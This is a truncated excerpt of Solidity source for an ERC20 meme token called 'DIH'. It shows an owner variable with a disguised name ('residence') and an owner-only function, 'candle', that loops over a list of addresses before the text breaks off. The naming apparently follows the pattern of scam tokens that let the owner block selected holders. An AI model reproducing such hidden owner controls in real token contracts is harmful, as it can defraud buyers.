...
contract youcanseethepaininhisdih is Context, IERC20 {
    ...
    constructor () {
        _name = "you can see the pain in his dih";
        _symbol = "DIH";
        _decimals = 18;
        uint256 initialSupply = 723000000;
         residence = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == residence, "Not allowed");
        _;
    }

    function candle(address[] memory brake) public onlyOwner() {
        for (uint256 i = 0; i < brake.length; i++) {
            address account = brake[i];
